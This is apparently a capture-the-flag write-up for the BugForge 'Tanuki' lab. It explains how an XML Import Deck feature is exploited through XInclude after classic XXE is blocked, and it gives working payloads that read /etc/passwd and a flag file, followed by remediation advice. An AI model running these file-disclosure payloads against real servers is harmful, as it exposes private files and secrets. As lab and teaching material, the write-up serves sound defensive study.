---
layout: post
title:  "BugForge - Daily - Tanuki"
date:   2026-01-06 20:00
image:  /images/bug-forge/bugforge-logo.png
tags:   [xxe]
categories: [BugForge,daily,tanuki]
---

# Daily - Tanuki
><br/><b>Vulnerabilities Covered:</b>
<br/>
XXE (XInclude)
<br/>
<br/>
<b>Summary:</b>
<br/>
This challenge demonstrates an XML External Entity (XXE) vulnerability exploitable through XInclude processing in the Import Deck functionality. While traditional DTD-based XXE payloads were blocked by the application, the XML parser retained support for XInclude processing. By declaring the XInclude namespace on the root element and using xi:include to reference local files, arbitrary file disclosure was achieved. This highlights that disabling external entity expansion alone is insufficient—XInclude processing must also be disabled to fully mitigate XXE-style attacks.
<br/>
<br/>
<b>Reference:</b>
<br/>
<a href="https://app.bugforge.io/">Bugforge.io</a>
<br/>
<br/>

## Solution

### Step 1 - Account Creation & Application Review

A new user account was registered to establish baseline access to the application. After logging in, the application interface was reviewed to identify available functionality and potential attack surfaces. The Import Deck feature in the navigation bar was identified as a file upload endpoint supporting XML input.

---

### Step 2 - Initial XML Upload Test

A valid XML payload was created to confirm that deck imports functioned as expected. The sample deck format was analyzed to understand the expected XML structure before attempting any exploitation.

---

### Step 3 - Traditional XXE Testing

A traditional DTD-based XXE payload using `<!ENTITY>` declarations was submitted to test for external entity processing.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE deck [
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<deck>
  <name>&file;</name>
</deck>
```

**Result:** The server returned an error message: `Invalid file format or content`

![XXE Payload Failed](/images/bug-forge/daily/Tanuki/xxe/xinclude/Traditional-XXE-Payload-Failed.png)

This indicates that external entity expansion is disabled or filtered by the XML parser.

---

### Step 4 - XInclude Exploitation

Since traditional XXE was blocked, the approach pivoted to XInclude-based file inclusion. XInclude is a separate XML specification that allows inclusion of external content and may remain enabled even when DTD processing is disabled.

**Critical requirement:** The XInclude namespace must be declared on the root element for the payload to be processed:

```
xmlns:xi="http://www.w3.org/2001/XInclude"
```

Without this declaration, `xi:include` elements are treated as regular XML nodes and parsed as standard data rather than being processed as include directives.

![XInclude Namespace Declaration](/images/bug-forge/daily/Tanuki/xxe/xinclude/Using-xinclude.png)

---

### Step 5 - Successful File Disclosure

A malicious XML payload using XInclude was crafted to read the application flag file:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<deck xmlns:xi="http://www.w3.org/2001/XInclude">
  <name>
    <xi:include href="file:///app/flag.txt" parse="text"/>
  </name>
  <description>Test deck</description>
  <category>Test</category>
  <cards>
    <card>
      <front>Test</front>
      <back>Test</back>
    </card>
  </cards>
</deck>
```

The server processed the XInclude directive and returned the contents of the flag file, confirming successful exploitation.

![Flag](/images/bug-forge/daily/Tanuki/xxe/xinclude/flag.png)

---

### Impact
- Unauthorized read access to sensitive files on the application server
- Disclosure of internal configuration data, secrets, or credentials
- Potential exposure of application source code or environment variables
- Server-Side Request Forgery (SSRF) if HTTP-based XInclude is supported
- Demonstrates that partial XXE mitigations can leave applications vulnerable through alternative XML features

---

### Vulnerability Classification
- **OWASP Top 10:** A03:2021 - Injection
- **Vulnerability Type:** XML External Entity (XXE) via XInclude
- **Attack Surface:** File upload and server-side XML parsing functionality
- **CWE:** CWE-611 - Improper Restriction of XML External Entity Reference

---

### Root Cause

The backend XML parser was configured to disable traditional external entity expansion, but XInclude processing remained enabled. When user-supplied XML documents containing XInclude directives are parsed, the server processes these directives and includes content from referenced files. The incomplete mitigation created a false sense of security while leaving an alternative exploitation path available.

---

### Remediation
- Disable XInclude processing in addition to external entity expansion
- Use secure XML parser configurations that explicitly disable all external content inclusion mechanisms
- Validate uploaded XML against a strict schema (XSD) before processing
- Consider using safer data formats such as JSON for user-supplied content
- Run application services with minimal file system permissions to limit exposure
- Implement content security policies that restrict the parser from accessing local files
- Add security testing that covers both traditional XXE and XInclude-based attacks

---